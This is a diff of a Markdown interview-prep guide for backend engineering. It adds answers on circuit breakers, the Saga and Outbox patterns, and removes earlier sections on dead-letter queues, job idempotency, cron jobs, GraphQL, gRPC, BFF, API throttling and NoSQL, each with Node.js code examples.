+const paymentBreaker = new CircuitBreaker(
+  (orderId, amount) => paymentService.charge(orderId, amount),
+  { failureThreshold: 5, timeout: 15000 }
+);
 
-  for (const msg of Messages || []) {
-    logger.error('Message in DLQ — needs investigation', {
-      messageId: msg.MessageId,
-      body:      msg.Body,
-      attributes: msg.Attributes  // includes retry count, first failure time
-    });
-
-    // After investigation, replay to main queue:
-    await sqs.send(new SendMessageCommand({
-      QueueUrl:    process.env.ORDER_QUEUE_URL,
-      MessageBody: msg.Body
-    }));
-    // Then delete from DLQ
+app.post('/orders/:id/pay', async (req, res) => {
+  try {
+    const result = await paymentBreaker.call(req.params.id, req.body.amount);
+    res.json({ success: true, result });
+  } catch (err) {
+    if (err.message.includes('Circuit OPEN')) {
+      // Graceful degradation: queue the payment for later retry
+      await paymentQueue.add('retry-payment', { orderId: req.params.id, amount: req.body.amount });
+      res.json({ success: true, status: 'payment_queued', message: 'Payment will be processed shortly' });
+    } else {
+      res.status(500).json({ error: err.message });
+    }
   }
-}
-
-// Set up alert: PagerDuty/Datadog alert when DLQ depth > 0
-```
-
-**BullMQ DLQ equivalent (failed jobs):**
-
-```js
-const queue = new Queue('orders', { connection: redis });
-const worker = new Worker('orders', processOrder, {
-  connection: redis,
-  // After 3 attempts, job moves to "failed" state (BullMQ's DLQ equivalent)
 });
 
-// Monitor failed jobs
-const failedJobs = await queue.getFailed(0, 100);
-for (const job of failedJobs) {
-  console.log('Failed job:', job.id, job.failedReason);
-  // Retry individual job:
-  await job.retry();
-}
+// Popular libraries: opossum (Node.js), resilience4j (Java), polly (.NET)
+const { CircuitBreaker: Opossum } = require('opossum');
+const breaker = new Opossum(paymentService.charge, {
+  timeout:           3000,  // 3s timeout per call
+  errorThresholdPercentage: 50,   // open if >50% fail
+  resetTimeout:      30000  // try again after 30s
+});
 ```
 
-> 📖 Reference: [Dead Letter Queue — AWS Docs](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-dead-letter-queues.html)
+> 📖 Reference: [Circuit Breaker — Martin Fowler](https://martinfowler.com/bliki/CircuitBreaker.html)
 
 ---
 
-**Q36. What is job idempotency in background processing? How do you ensure a job is safe to retry?**
+**Q7. What is the Saga pattern? Compare orchestration vs choreography.**
 
 **Answer:**
 
-A job is **idempotent** if running it multiple times produces the same result as running it once — essential for safe retries when at-least-once delivery can cause duplicates.
+When a business transaction spans multiple services (each with its own DB), traditional ACID transactions don't work. A **Saga** is a sequence of local transactions where each step publishes an event or message to trigger the next — with **compensating transactions** to undo completed steps on failure.
 
-**Non-idempotent job (dangerous):**
+**Example: Place order saga**
+```
+1. Order Service:    Create order (PENDING)
+2. Inventory Service: Reserve items
+3. Payment Service:  Charge card
+4. Shipping Service: Schedule delivery
+5. Order Service:    Mark order CONFIRMED
+
+If step 3 (Payment) fails:
+→ Compensate step 2: Release reserved inventory
+→ Compensate step 1: Cancel/reject order
+```
+
+**Orchestration (Conductor model):**
+A central **orchestrator** coordinates all steps and knows the full flow.
 
 ```js
-// ❌ Running this twice charges the user twice!
-emailQueue.process('send-invoice', async (job) => {
-  const { userId, amount } = job.data;
+// Orchestrator: Order Orchestrator Service
+class PlaceOrderSaga {
+  async execute(orderData) {
+    const sagaId = crypto.randomUUID();
 
-  const invoice = await createInvoice(userId, amount); // creates a new invoice each time!
-  await stripe.charges.create({ amount, customer: userId });
-  await sendInvoiceEmail(userId, invoice.id);
+    try {
+      // Step 1: Create order
+      const order = await orderService.createOrder({ ...orderData, sagaId });
+
+      // Step 2: Reserve inventory
+      const reservation = await inventoryService.reserve({
+        items: orderData.items, sagaId
+      });
+
+      // Step 3: Charge payment
+      const payment = await paymentService.charge({
+        userId: orderData.userId,
+        amount: order.total,
+        sagaId
+      });
+
+      // Step 4: Schedule shipping
+      await shippingService.schedule({ orderId: order.id, sagaId });
+
+      // All succeeded!
+      await orderService.confirm(order.id);
+      return { success: true, orderId: order.id };
+
+    } catch (err) {
+      // Compensate in reverse order
+      await this.compensate(sagaId, err);
+      throw err;
+    }
+  }
+
+  async compensate(sagaId, failedAt) {
+    // Undo steps that succeeded before the failure
+    if (failedAt.step >= 3) await inventoryService.releaseReservation(sagaId);
+    if (failedAt.step >= 1) await orderService.cancelOrder(sagaId);
+  }
+}
+```
+
+**Choreography (Event-driven model):**
+No central orchestrator. Each service listens to events, reacts, and publishes its own events.
+
+```js
+// Each service listens to and emits events independently
+
+// Order Service: publishes ORDER_CREATED
+eventBus.publish('ORDER_CREATED', { orderId, items, userId, total });
+
+// Inventory Service: listens to ORDER_CREATED, publishes INVENTORY_RESERVED or INVENTORY_FAILED
+eventBus.subscribe('ORDER_CREATED', async ({ orderId, items }) => {
+  try {
+    await reserveItems(items);
+    eventBus.publish('INVENTORY_RESERVED', { orderId });
+  } catch {
+    eventBus.publish('INVENTORY_FAILED', { orderId });
+  }
+});
+
+// Payment Service: listens to INVENTORY_RESERVED
+eventBus.subscribe('INVENTORY_RESERVED', async ({ orderId }) => {
+  try {
+    const order = await getOrder(orderId);
+    await chargeCard(order.userId, order.total);
+    eventBus.publish('PAYMENT_COMPLETED', { orderId });
+  } catch {
+    eventBus.publish('PAYMENT_FAILED', { orderId });
+    // Compensate: release inventory
+    eventBus.publish('RELEASE_INVENTORY', { orderId });
+  }
 });
 ```
 
-**Making it idempotent — 4 techniques:**
+| | Orchestration | Choreography |
+|--|--------------|-------------|
+| Coordination | Central orchestrator knows all steps | Each service knows only its own step |
+| Visibility | Easy to see full flow in one place | Flow is implicit — spread across services |
+| Coupling | Services coupled to orchestrator | Services only coupled to events |
+| Debugging | Easier — one place to check state | Harder — trace events across services |
+| Single point of failure | Orchestrator can become bottleneck | No single bottleneck |
+| Best for | Complex workflows, strict ordering | Loose workflows, many consumers |
+
+> 📖 Reference: [Saga Pattern — Microsoft](https://learn.microsoft.com/en-us/azure/architecture/reference-architectures/saga/saga)
+
+---
+
+**Q8. What is the Outbox pattern? How does it solve the dual-write problem?**
+
+**Answer:**
+
+The **dual-write problem**: when you write to the DB AND publish a message, one can succeed while the other fails — leaving systems out of sync.
 
 ```js
-// ── Technique 1: Dedupe key / idempotency token ───────────────────────
-emailQueue.process('send-invoice', async (job) => {
-  const { userId, billingPeriod } = job.data;
+// ❌ Dual-write problem
+await db.query('INSERT INTO orders ...'); // succeeds
+await kafka.publish('ORDER_CREATED', ...); // FAILS (Kafka down)
+// DB has the order but nobody knows it was created
+// OR:
+await kafka.publish('ORDER_CREATED', ...); // succeeds
+await db.query('INSERT INTO orders ...'); // FAILS
+// Event published but order doesn't exist in DB!
+```
 
-  // Check if invoice already exists for this user + period
-  const existing = await db.query(
-    'SELECT id FROM invoices WHERE user_id = ? AND billing_period = ?',
-    [userId, billingPeriod]
-  );
+The **Outbox pattern** fixes this by writing to an outbox table in the SAME database transaction as the main write. A separate process then reliably publishes outbox records to the message broker.
 
-  if (existing) {
-    logger.info('Invoice already created — skipping', { existing: existing.id });
-    return { invoiceId: existing.id }; // safe to return early
-  }
+```js
+// ✅ Outbox pattern — atomic write to DB + outbox in one transaction
 
-  const invoice = await createInvoice(userId, billingPeriod);
-  await stripe.charges.create({
-    amount:   invoice.amount,
-    customer: userId,
-    idempotency_key: `invoice-${invoice.id}` // Stripe deduplication
-  });
-  await sendInvoiceEmail(userId, invoice.id);
-  return { invoiceId: invoice.id };
-});
-
-// ── Technique 2: Upsert instead of insert ────────────────────────────
-emailQueue.process('update-user-stats', async (job) => {
-  const { userId, date, loginCount } = job.data;
-
-  // INSERT ... ON CONFLICT UPDATE is idempotent
-  await db.query(`
-    INSERT INTO user_stats (user_id, date, login_count)
-    VALUES (?, ?, ?)
-    ON CONFLICT (user_id, date)
-    DO UPDATE SET login_count = EXCLUDED.login_count
-  `, [userId, date, loginCount]);
-  // Running 3 times = same result ✅
-});
-
-// ── Technique 3: Check + set status atomically ────────────────────────
-emailQueue.process('send-welcome-email', async (job) => {
-  const { userId } = job.data;
-
-  // Atomically mark email as "sending" — only one worker can do this
-  const result = await db.query(
-    `UPDATE users
-     SET welcome_email_status = 'sending'
-     WHERE id = ? AND welcome_email_status = 'pending'`,
-    [userId]
-  );
-
-  if (result.affectedRows === 0) {
-    logger.info('Welcome email already sent or sending — skipping');
-    return; // another worker already handled it
-  }
-
+// Step 1: Write order AND outbox entry in ONE transaction
+app.post('/orders', async (req, res) => {
+  await db.query('BEGIN');
   try {
-    await sendEmail(userId, 'welcome');
-    await db.query(
-      "UPDATE users SET welcome_email_status = 'sent' WHERE id = ?", [userId]
+    // Create the order
+    const order = await db.query(
+      'INSERT INTO orders (user_id, total, status) VALUES ($1, $2, $3) RETURNING *',
+      [req.body.userId, req.body.total, 'pending']
     );
+
+    // Write to outbox in the SAME transaction (atomic!)
+    await db.query(
+      `INSERT INTO outbox (aggregate_type, aggregate_id, event_type, payload, created_at)
+       VALUES ($1, $2, $3, $4, NOW())`,
+      ['Order', order.rows[0].id, 'ORDER_CREATED', JSON.stringify({
+        orderId: order.rows[0].id,
+        userId:  req.body.userId,
+        total:   req.body.total,
+        items:   req.body.items
+      })]
+    );
+
+    await db.query('COMMIT');
+    // If Kafka is down: order exists in DB, outbox record is there, will be published later ✅
+    // If DB fails: ROLLBACK — neither order nor outbox record exists ✅
+    res.status(201).json(order.rows[0]);
   } catch (err) {
-    // Reset on failure so it can be retried
-    await db.query(
-      "UPDATE users SET welcome_email_status = 'pending' WHERE id = ?", [userId]
-    );
+    await db.query('ROLLBACK');
     throw err;
   }
 });
 
-// ── Technique 4: Use job.id as idempotency key ────────────────────────
-emailQueue.process('resize-image', async (job) => {
-  const outputKey = `thumbnails/${job.id}-200x200.jpg`; // unique per job
-
-  // Check if already processed
-  const exists = await s3.headObject({ Bucket: 'images', Key: outputKey }).catch(() => null);
-  if (exists) return { thumbnailKey: outputKey }; // already done
-
-  const thumbnail = await resizeImage(job.data.sourceKey, 200, 200);
-  await s3.putObject({ Bucket: 'images', Key: outputKey, Body: thumbnail });
-  return { thumbnailKey: outputKey };
-});
-```
-
-> 📖 Reference: [Idempotent Workers — Sidekiq Best Practices](https://github.com/sidekiq/sidekiq/wiki/Best-Practices)
-
----
-
-**Q37. What is the difference between a cron job and an event-driven background job?**
-
-**Answer:**
-
-| | Cron Job | Event-Driven Job |
-|--|----------|-----------------|
-| Trigger | Time-based schedule | Event or user action |
-| When | Predictable (daily, hourly, monthly) | Unpredictable (immediately when event occurs) |
-| Latency | High (waits for next schedule) | Low (near-immediate) |
-| Examples | Monthly billing, nightly reports, DB cleanup | Send email on signup, resize image on upload |
-
-**Cron job example:**
-
-```js
-const cron = require('node-cron');
-
-// ✅ Good for time-based, batch operations
-
-// Run every night at 2 AM
-cron.schedule('0 2 * * *', async () => {
-  console.log('Running nightly cleanup');
-  await db.query(`DELETE FROM sessions WHERE expires_at < NOW()`);
-  await db.query(`DELETE FROM temp_uploads WHERE created_at < NOW() - INTERVAL '24 hours'`);
-});
-
-// Run on 1st of every month at 8 AM
-cron.schedule('0 8 1 * *', async () => {
-  console.log('Running monthly invoice generation');
-  const subscriptions = await getActiveSubscriptions();
-
-  for (const sub of subscriptions) {
-    await billingQueue.add('generate-invoice', { subscriptionId: sub.id });
-  }
-});
-
-// Every 5 minutes: sync exchange rates
-cron.schedule('*/5 * * * *', async () => {
-  const rates = await fetchExchangeRates();
-  await redis.set('exchange_rates', JSON.stringify(rates), 'EX', 360);
-});
-```
-
-**Event-driven job example:**
-
-```js
-// ✅ Good for immediate reaction to user actions
-
-// Event: user signs up
-app.post('/register', async (req, res) => {
-  const user = await User.create(req.body);
-  // Trigger immediately:
-  await emailQueue.add('send-welcome', { userId: user.id });
-  await analyticsQueue.add('track-signup', { userId: user.id, source: req.body.referrer });
-  await notificationQueue.add('notify-admin', { newUserId: user.id });
-  res.status(201).json(user);
-});
-
-// Event: order placed
-app.post('/orders', async (req, res) => {
-  const order = await Order.create(req.body);
-  // Trigger immediately:
-  await queue.add('send-order-confirmation', { orderId: order.id });
-  await queue.add('update-inventory',        { items: order.items });
-  await queue.add('notify-warehouse',        { orderId: order.id });
-  res.status(201).json(order);
-});
-```
-
-**When to use cron:**
-- Cleanup, maintenance, reporting tasks.
-- Periodic syncs with external systems.
-- Tasks that MUST run at a specific time.
-
-**When to use event-driven:**
-- React immediately to user actions.
-- Decouple producer from consumer.
-- Handle tasks that vary in volume with user traffic.
-
-> 📖 Reference: [Cron vs Event-Driven — AWS](https://aws.amazon.com/event-driven-architecture/)
-
----
-
-## 6. API Design Patterns
-
----
-
-**Q38. What is GraphQL? How does it compare to REST in terms of over-fetching and under-fetching?**
-
-**Answer:**
-
-**GraphQL** is a query language for APIs where the **client specifies exactly what data it needs** — no more, no less. The server exposes a single endpoint.
-
-**Over-fetching (REST problem):**
-
-```
-REST: GET /users/42
-Response: { id, name, email, phone, address, bio, preferences, createdAt, updatedAt, ... }
-// Client only needed: id, name, email
-// 80% of the data was wasted bandwidth ← over-fetching
-
-GraphQL: query { user(id: 42) { id name email } }
-Response: { user: { id: 42, name: "Alice", email: "alice@example.com" } }
-// Gets exactly what was asked for ✅
-```
-
-**Under-fetching (REST problem):**
-
-```
-REST: Build a user profile page
-→ GET /users/42           (user info)
-→ GET /users/42/posts     (recent posts)
-→ GET /users/42/followers (follower count)
-→ GET /users/42/stats     (activity stats)
-= 4 separate round trips ← under-fetching (need more data than one endpoint gives)
-
-GraphQL: Single query:
-query {
-  user(id: 42) {
-    id
-    name
-    email
-    recentPosts(limit: 3) { id title createdAt }
-    followerCount
-    stats { postsCount likesReceived }
-  }
-}
-= 1 round trip, gets everything ✅
-```
-
-**GraphQL server example:**
-
-```js
-const { ApolloServer, gql } = require('@apollo/server');
-
-const typeDefs = gql`
-  type User {
-    id: ID!
-    name: String!
-    email: String!
-    orders(limit: Int = 10): [Order!]!
-  }
-
-  type Order {
-    id: ID!
-    total: Float!
-    status: String!
-    createdAt: String!
-  }
-
-  type Query {
-    user(id: ID!): User
-    users(page: Int, limit: Int): [User!]!
-  }
-
-  type Mutation {
-    createUser(name: String!, email: String!, password: String!): User!
-    updateUser(id: ID!, name: String, email: String): User!
-  }
-`;
-
-const resolvers = {
-  Query: {
-    user: (_, { id }) => User.findById(id),
-    users: (_, { page = 1, limit = 20 }) => User.findAll({ page, limit }),
-  },
-  User: {
-    orders: (user, { limit }) => Order.findByUserId(user.id, { limit }),
-  },
-  Mutation: {
-    createUser: (_, args) => User.create(args),
-  }
-};
-
-// REST vs GraphQL comparison:
-// REST  → multiple endpoints: GET /users/:id, GET /users/:id/orders
-// GraphQL → single endpoint: POST /graphql with query in body
-```
-
-> 📖 Reference: [GraphQL vs REST — Apollo](https://www.apollographql.com/blog/graphql-vs-rest)
-
----
-
-**Q39. What is gRPC? What makes it faster than REST for internal service communication?**
-
-**Answer:**
-
-**gRPC** (Google Remote Procedure Call) is a high-performance, binary RPC framework. You define services and message types in `.proto` files, and gRPC generates client/server code automatically.
-
-**Why gRPC is faster than REST:**
-
-| | REST (JSON over HTTP/1.1) | gRPC (Protobuf over HTTP/2) |
-|--|--------------------------|----------------------------|
-| Serialization | Text JSON (~5x larger) | Binary Protobuf (~5x smaller) |
-| Protocol | HTTP/1.1 (one request per connection) | HTTP/2 (multiplexed streams, header compression) |
-| Schema | Optional (OpenAPI) | Required (proto file) — type safety guaranteed |
-| Code generation | Manual client | Auto-generated typed clients |
-| Streaming | Limited (polling or SSE) | Native bi-directional streaming |
-| Performance | ~slower | ~5-10x faster for high-throughput |
-
-**Example:**
-
-```protobuf
-// user.proto — service definition
-syntax = "proto3";
-
-service UserService {
-  rpc GetUser     (GetUserRequest)     returns (User);
-  rpc CreateUser  (CreateUserRequest)  returns (User);
-  rpc ListUsers   (ListUsersRequest)   returns (stream User);  // server streaming
-  rpc WatchUser   (stream UserEvent)   returns (stream User);  // bidirectional
-}
-
-message User {
-  string id    = 1;
-  string name  = 2;
-  string email = 3;
-  int32  age   = 4;
-}
-
-message GetUserRequest { string id = 1; }
-message CreateUserRequest {
-  string name  = 1;
-  string email = 2;
-  string password = 3;
-}
-```
-
-```js
-// gRPC server (Node.js)
-const grpc     = require('@grpc/grpc-js');
-const protoLoader = require('@grpc/proto-loader');
-
-const packageDef = protoLoader.loadSync('user.proto');
-const proto      = grpc.loadPackageDefinition(packageDef);
-
-const server = new grpc.Server();
-server.addService(proto.UserService.service, {
-  getUser: async (call, callback) => {
-    const user = await User.findById(call.request.id);
-    callback(null, user);
-  },
-  createUser: async (call, callback) => {
-    const user = await User.create(call.request);
-    callback(null, user);
-  },
-  listUsers: async (call) => {
-    const users = await User.findAll();
-    users.forEach(user => call.write(user));
-    call.end();
-  }
-});
-server.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {
-  server.start();
-});
-```
-
-**When to use gRPC:**
-- Internal microservice communication (not public-facing APIs).
-- High-throughput scenarios (thousands of calls/sec between services).
-- Strong typing needed across polyglot services (Go, Java, Python, Node.js).
-- Real-time streaming (chat, live updates, telemetry).
-
-**When to stick with REST:**
-- Public APIs consumed by browsers/third parties (gRPC requires HTTP/2 which browsers don't natively support for gRPC).
-- Simple CRUD APIs where performance isn't critical.
-
-> 📖 Reference: [gRPC Introduction — gRPC Docs](https://grpc.io/docs/what-is-grpc/introduction/)
-
----
-
-**Q40. What is the BFF (Backend for Frontend) pattern? When is it useful?**
-
-**Answer:**
-
-**BFF** creates a dedicated backend service tailored specifically for each frontend client (web app, mobile app, third-party API). Instead of one generic API serving all clients, each client gets its own API layer.
-
-```
-Without BFF:
-Mobile App ─────────┐
-Web App ─────────────┼──► Generic API ──► Microservices
-Smart TV App ────────┘
-(all clients use the same endpoints, get same data shape)
-
-With BFF:
-Mobile App ──► Mobile BFF ─────┐
-Web App ──────► Web BFF ─────── ├──► Microservices (User, Order, Product, etc.)
-Smart TV ──────► TV BFF ────────┘
-```
-
-**Real-world example:**
-
-```js
-// ❌ Without BFF: generic API returns everything, clients filter what they need
-app.get('/api/product/:id', async (req, res) => {
-  const product = await productService.getProduct(req.params.id);
-  // Returns 40 fields — mobile only needs 8, web needs 20, TV needs 5
-  res.json(product);
-});
-
-// ✅ With BFF: each client gets exactly what it needs
-
-// Mobile BFF (src/bff/mobile.js)
-mobileBff.get('/product/:id', async (req, res) => {
-  const [product, inventory, reviews] = await Promise.all([
-    productService.getProduct(req.params.id),
-    inventoryService.getStock(req.params.id),
-    reviewService.getTopReview(req.params.id)
-  ]);
-
-  // Optimized for mobile: minimal data, pre-aggregated
-  res.json({
-    id:          product.id,
-    name:        product.name,
-    price:       product.price,
-    thumbnail:   product.images[0]?.thumbnailUrl, // only thumbnail, not all images
-    inStock:     inventory.available > 0,
-    rating:      reviews.averageRating,
-    reviewCount: reviews.count
-    // Only 7 fields — mobile uses exactly these
-  });
-});
-
-// Web BFF (src/bff/web.js)
-webBff.get('/product/:id', async (req, res) => {
-  const [product, inventory, reviews, recommendations] = await Promise.all([
-    productService.getProduct(req.params.id),
-    inventoryService.getDetailedStock(req.params.id),
-    reviewService.getReviews(req.params.id, { limit: 5 }),
-    recommendationService.getSimilar(req.params.id, { limit: 8 })
-  ]);
-
-  // Richer response for web
-  res.json({
-    product: { ...product, allImages: product.images },
-    inventory: { available: inventory.available, warehouse: inventory.warehouse },
-    reviews:        reviews,
-    recommendations: recommendations
-  });
-});
-```
-
-**When BFF is useful:**
-- Different clients need very different data shapes.
-- Mobile needs minimal data (bandwidth constraints).
-- Reducing client-side aggregation logic (multiple API calls → one BFF call).
-- Different auth requirements per client.
-
-**When to avoid BFF:**
-- Simple apps with one client type.
-- Small teams — maintaining multiple backends has overhead.
-- Clients have very similar needs.
-
-> 📖 Reference: [BFF Pattern — Sam Newman](https://samnewman.io/patterns/architectural/bff/)
-
----
-
-**Q41. What is the difference between a public API and an internal API? How do you design each differently?**
-
-**Answer:**
-
-| Design Concern | Public API | Internal API |
-|---------------|-----------|-------------|
-| Stability | Must be stable — breaking changes hurt external developers | Can evolve faster — you control all consumers |
-| Versioning | Mandatory (`/v1/`, `/v2/`) | Optional — coordinate internally |
-| Documentation | Comprehensive (OpenAPI/Swagger, examples, SDKs) | Lighter — internal wikis, code comments |
-| Authentication | API keys, OAuth 2.0, rate limiting | mTLS, internal service tokens, VPN |
-| Rate limiting | Strict per-client quotas | Looser — trusted internal callers |
-| Error messages | User-friendly, no internal details | Can include stack traces, internal codes |
-| Schema | Conservative — avoid breaking changes | Can be more flexible |
-| Backwards compat | Critical — maintain old versions for years | Less critical |
-
-```js
-// ── Public API design ────────────────────────────────────────────────
-// /v1/users — versioned, stable, documented, sanitized errors
-app.get('/v1/users/:id',
-  apiKeyAuth,          // require API key
-  rateLimiter,         // 100 req/min per API key
-  async (req, res) => {
-    const user = await User.findById(req.params.id);
-    if (!user) {
-      return res.status(404).json({
-        error: { code: 'USER_NOT_FOUND', message: 'User not found' }
-        // No internal details (no stack trace, no DB column names)
-      });
+// Step 2: Outbox relay — reads outbox and publishes to Kafka (separate process)
+async function outboxRelay() {
+  while (true) {
+    // Fetch unpublished events
+    const events = await db.query(
+      `SELECT * FROM outbox WHERE published_at IS NULL ORDER BY created_at ASC LIMIT 100`
+    );
+
+    for (const event of events.rows) {
+      try {
+        await kafka.producer().send({
+          topic: `${event.aggregate_type.toLowerCase()}-events`,
+          messages: [{
+            key:   event.aggregate_id.toString(),
+            value: event.payload
+          }]
+        });
+
+        // Mark as published
+        await db.query(
+          'UPDATE outbox SET published_at = NOW() WHERE id = $1',
+          [event.id]
+        );
+      } catch (err) {
+        console.error('Failed to publish event', event.id, err.message);
+        // Will retry on next iteration
+      }
     }
-    // Never expose internal fields
-    const { password_hash, internal_notes, stripe_customer_id, ...publicUser } = user;
-    res.json({ data: publicUser });
+
+    await sleep(1000); // poll every second
   }
-);
+}
 
-// ── Internal API design ──────────────────────────────────────────────
-// /internal/users — faster, richer, less formal
-app.get('/internal/users/:id',
-  internalServiceAuth, // validate internal service token
-  async (req, res) => {
-    const user = await User.findByIdWithAllFields(req.params.id);
-    if (!user) {
-      return res.status(404).json({
-        error: 'User not found',
-        query: { userId: req.params.id },  // more debug info ok internally
-        timestamp: new Date()
-      });
-    }
-    res.json(user); // full object — internal service can handle it
-  }
-);
+// Step 3: Use Debezium for production (CDC-based outbox relay)
+// Debezium watches the outbox table in PostgreSQL WAL
+// Automatically publishes new rows to Kafka
+// Zero-polling, near-real-time, highly reliable
 ```
 
-> 📖 Reference: [API Design — Zalando Guidelines](https://opensource.zalando.com/restful-api-guidelines/)
-
----
-
-**Q42. What is API gateway throttling? How does it protect your backend services?**
-
-**Answer:**
-
-**API gateway throttling** limits the rate of requests that can reach your backend, protecting downstream services from overload. It happens BEFORE the request reaches your application servers.
-
-```
-Without throttling:
-DDoS: 1,000,000 req/sec → Your servers → Overloaded → Crash 💥
-
-With throttling (API Gateway):
-1,000,000 req/sec → API Gateway → Allow 10,000/sec → Servers ✅
-                                → Return 429 for the rest
-```
-
-**Throttling types:**
-
-```
-1. Global rate limit:     Max 10,000 req/sec across ALL clients
-2. Per-client limit:      Max 100 req/min per API key
-3. Per-endpoint limit:    /auth/login limited to 5 req/min (brute-force protection)
-4. Burst limit:           Allow 100 req/sec burst, but average 10 req/sec
-```
-
-**AWS API Gateway throttling:**
-
-```yaml
-# serverless.yml or AWS CDK
-provider:
-  name: aws
-  apiGateway:
-    throttling:
-      maxRequestsPerSecond: 10000    # global limit
-      maxConcurrentRequests: 5000
-
-functions:
-  createUser:
-    handler: src/users.create
-    events:
-      - http:
-          path: /users
-          method: post
-          throttling:
-            maxRequestsPerSecond: 100  # per-endpoint limit
-            maxConcurrentRequests: 50
-```
-
-**Custom throttling middleware example:**
-
-```js
-const rateLimit = require('express-rate-limit');
-const RedisStore = require('rate-limit-redis');
-
-// Global rate limit
-app.use(rateLimit({
-  windowMs: 60 * 1000,   // 1 minute
-  max:      1000,         // 1000 requests per minute globally
-  standardHeaders: true,  // Return RateLimit-* headers
-  legacyHeaders: false,
-  store: new RedisStore({ client: redis }), // distributed — works across servers
-  handler: (req, res) => {
-    res.status(429).json({
-      error: 'Too Many Requests',
-      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000)
-    });
-  }
-}));
-
-// Stricter limit for auth endpoints
-app.use('/auth', rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max:      10,              // only 10 login attempts per 15 minutes per IP
-  message:  { error: 'Too many login attempts. Try again in 15 minutes.' }
-}));
-
-// Per-user rate limiting (after auth)
-const userRateLimit = rateLimit({
-  windowMs: 60 * 1000,
-  max:      200,
-  keyGenerator: (req) => req.user?.userId || req.ip, // key by user ID, not IP
-  store: new RedisStore({ client: redis })
-});
-app.use('/api/', requireAuth, userRateLimit);
-```
-
-> 📖 Reference: [API Throttling — AWS API Gateway Docs](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-request-throttling.html)
-
----
-
-## 7. NoSQL Databases
-
----
-
-**Q43. What are the different types of NoSQL databases? (Document, Key-Value, Column-Family, Graph)**
-
-**Answer:**
-
-| Type | Structure | Best for | Examples |
-|------|-----------|---------|---------|
-| **Document** | JSON/BSON documents | Content, user profiles, catalogs | MongoDB, CouchDB, Firestore |
-| **Key-Value** | Simple key → value | Caching, sessions, simple lookups | Redis, DynamoDB, Riak |
-| **Column-Family** | Rows with dynamic columns, optimized for column reads | Analytics, time-series, wide tables | Cassandra, HBase, ScyllaDB |
-| **Graph** | Nodes and edges (relationships) | Social networks, fraud detection, recommendation | Neo4j, Amazon Neptune, JanusGraph |
-
-**Use case examples:**
-
-```js
-// ── Document DB (MongoDB) — flexible schema, nested data ─────────────
-const product = {
-  _id: ObjectId('...'),
-  name: 'iPhone 15',
-  category: 'electronics',
-  specs: {                     // nested document
-    storage: ['128GB', '256GB', '512GB'],
-    colors: ['Black', 'White', 'Blue'],
-    weight: '171g'
-  },
-  variants: [                  // array of sub-documents
-    { storage: '128GB', color: 'Black', price: 799, sku: 'IP15-128-BLK' },
-    { storage: '256GB', color: 'White', price: 899, sku: 'IP15-256-WHT' }
-  ],
-  reviews: { count: 1523, average: 4.7 }
-};
-// Fits naturally as a document — no joins needed to get all product info
-
-// ── Key-Value (Redis) — fast simple lookups ───────────────────────────
-await redis.set('session:abc123', JSON.stringify({ userId: 42, role: 'admin' }), 'EX', 3600);
-await redis.get('session:abc123'); // 0.1ms lookup
-
-// ── Column-Family (Cassandra) — time-series IoT data ─────────────────
-// Table: sensor_readings (partition key: sensor_id, clustering: timestamp)
-// All readings for one sensor stored together on disk = fast time-range queries
-// Perfect for: sensor data, metrics, user activity logs, IoT
-
-// ── Graph DB (Neo4j) — social network "friends of friends" ───────────
-// Find all users who follow Alice and Bob but not Carol
-// In SQL: complex multi-join query
-// In Neo4j Cypher:
-// MATCH (u:User)-[:FOLLOWS]->(alice:User {name: 'Alice'})
-// MATCH (u)-[:FOLLOWS]->(bob:User {name: 'Bob'})
-// WHERE NOT (u)-[:FOLLOWS]->(:User {name: 'Carol'})
-// RETURN u.name
-```
-
-> 📖 Reference: [NoSQL Types — MongoDB](https://www.mongodb.com/nosql-explained)
-
----
-
-**Q44. What is MongoDB? How does it store data differently from a relational database?**
-
-**Answer:**
-
-MongoDB is a document-oriented NoSQL database that stores data as **BSON** (Binary JSON) documents in collections. Unlike SQL's rigid rows and tables, documents are schema-flexible and can hold nested objects and arrays.
-
-**Core differences:**
-
-| | MongoDB | PostgreSQL |
-|--|---------|-----------|
-| Storage unit | Document (BSON) | Row |
-| Grouping | Collection | Table |
-| Schema | Flexible / schema-less | Fixed schema |
-| Relationships | Embedded or referenced (manual joins) | Foreign keys + JOINs |
-| Query language | MongoDB Query Language | SQL |
-
-**Example — blog with comments:**
-
-```js
-// ── SQL approach — normalized, 2 tables, JOIN required ───────────────
-// posts table: id, title, body, author_id, created_at
-// comments table: id, post_id, author_name, body, created_at
-
-// To get post with comments: SELECT ... JOIN ...
-
-// ── MongoDB approach — embed comments in post document ───────────────
-const post = {
-  _id: ObjectId('64abc...'),
-  title: 'Getting Started with MongoDB',
-  body: 'MongoDB is a document database...',
-  authorId: ObjectId('64def...'),
-  tags: ['mongodb', 'database', 'nosql'],
-  createdAt: new Date(),
-  comments: [                          // embedded array — no JOIN needed
-    {
-      _id: ObjectId('64ghi...'),
-      authorName: 'Alice',
-      body: 'Great article!',
-      createdAt: new Date(),
-      likes: 5
-    },
-    {
-      _id: ObjectId('64jkl...'),
-      authorName: 'Bob',
-      body: 'Very helpful, thanks!',
-      createdAt: new Date(),
-      likes: 2
-    }
-  ]
-};
-
-// CRUD operations
-const db = client.db('blog');
-
-// Create
-await db.collection('posts').insertOne(post);
-
-// Read with query
-await db.collection('posts').find({
-  tags: 'mongodb',                           // array contains
-  createdAt: { $gte: new Date('2024-01-01') } // range query
-}).sort({ createdAt: -1 }).limit(10).toArray();
-
-// Update — add a comment
-await db.collection('posts').updateOne(
-  { _id: postId },
-  { $push: { comments: newComment } }   // append to array
-);
-
-// Aggregation pipeline
-await db.collection('posts').aggregate([
-  { $match: { tags: 'mongodb' } },
-  { $unwind: '$comments' },
-  { $group: { _id: '$_id', commentCount: { $sum: 1 } } },
-  { $sort: { commentCount: -1 } }
-]);
-```
-
-> 📖 Reference: [MongoDB Introduction — MongoDB Docs](https://www.mongodb.com/docs/manual/introduction/)
-
----
-
-**Q45. When would you choose a NoSQL database over a relational database?**
-
-**Answer:**
-
-Choose NoSQL when:
-
-```
-1. Schema changes frequently or is unpredictable
-   → Document DB (MongoDB): product catalog with different specs per category
-   → Each product has different attributes: laptops have RAM/CPU, shirts have size/color
-
-2. Extreme write/read throughput (millions of ops/sec)
-   → Cassandra, DynamoDB: IoT sensor data, click tracking, event logs
-
